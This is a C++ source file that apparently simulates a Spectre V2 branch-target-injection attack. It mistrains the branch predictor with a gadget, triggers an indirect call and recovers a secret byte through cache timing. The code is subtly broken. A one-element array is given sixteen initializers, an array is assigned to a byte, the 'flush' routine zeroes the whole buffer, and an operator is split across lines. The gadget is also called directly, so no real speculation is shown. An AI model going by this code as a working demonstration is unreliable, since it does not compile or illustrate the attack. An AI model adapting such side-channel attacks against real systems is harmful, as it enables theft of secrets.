#include <iostream>
#include <vector>
#include <chrono>
#include <map>

// --- Victim's Code (simulated privileged/isolated context) ---
unsigned char secret_key[1] = {0xDE, 0xAD, 0xBE, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0, 0x11, 0x22, 0x33, 0x44};
unsigned char probe_array[256 * 4096]; // Cache side channel

// A benign function pointer target
void benign_target_function() {
    // Does something harmless
    volatile int x = 1;
}

// An attacker-controlled "gadget" within the victim's address space
// In a real scenario, this would be a sequence of existing instructions
// that can be chained to leak data.
void attacker_gadget_function() {
    // This function is speculatively executed.
    // It reads a secret byte (e.g., from secret_key) and uses it to
    // access the probe_array, creating a cache side effect.
    unsigned char secret_byte = secret_key; // Transiently read secret
    volatile unsigned char temp = probe_array[secret_byte * 4096]; // Cache side effect
}

// The victim function with an indirect call
typedef void (*func_ptr_t)();
void victim_indirect_call(func_ptr_t ptr) {
    ptr(); // This is the indirect branch that will be mispredicted
}

// --- Attacker's Code ---
long long measure_access_time(volatile unsigned char* addr) {
    auto start = std::chrono::high_resolution_clock::now();
    volatile unsigned char temp = *addr;
    auto end = std::chrono::high_resolution_clock::now();
    return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
}

void flush_cache_line(volatile unsigned char* addr) {
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array[i] = 0;
    }
}

int main() {
    // Initialize probe_array
    for (int i = 0; i < 256 * 4096; ++i) {
        probe_array[i] = 1;
    }

    std::cout << "Starting Spectre V2 attack simulation..." << std::endl;

    // Phase 1: Mistrain the Branch Target Buffer (BTB)
    // The attacker repeatedly calls a benign function pointer that has the same
    // hash/index in the BTB as the victim's indirect call site.
    // The goal is to associate the victim's indirect call instruction with the
    // attacker_gadget_function address in the BTB.
    std::cout << "Mistraining BTB with attacker gadget address..." << std::endl;
    for (int i = 0; i < 1000; ++i) {
        // In a real attack, this would involve carefully crafted calls
        // to a function that aliases with the victim's indirect branch.
        // Here, we directly call the gadget to train the BTB for simplicity.
        victim_indirect_call(&attacker_gadget_function);
    }

    // Phase 2: Trigger the victim's indirect call
    std::cout << "Triggering victim's indirect call..." << std::endl;
    // Flush the probe array before triggering
    for (int i = 0; i < 256; ++i) {
        flush_cache_line(&probe_array[i * 4096]);
    }

    // Call the victim function with its *intended* benign target.
    // The CPU, due to BTB mistraining, will speculatively jump to attacker_gadget_function.
    victim_indirect_call(&benign_target_function);

    // Phase 3: Recover the secret via side channel
    std::cout << "Measuring cache access times to recover secret..." << std::endl;
    long long min_time = -1;
    int leaked_byte = -1;

    for (int i = 0; i < 256; ++i) {
        long long time = measure_access_time(&probe_array[i * 4096]);
        if (min_time == -1 |
| time < min_time) {
            min_time = time;
            leaked_byte = i;
        }
    }

    std::cout << "Simulated leaked byte: 0x" << std::hex << leaked_byte << std::endl;
    std::cout << "Expected secret byte (first byte of key): 0x" << std::hex << (int)secret_key << std::endl;

    return 0;
}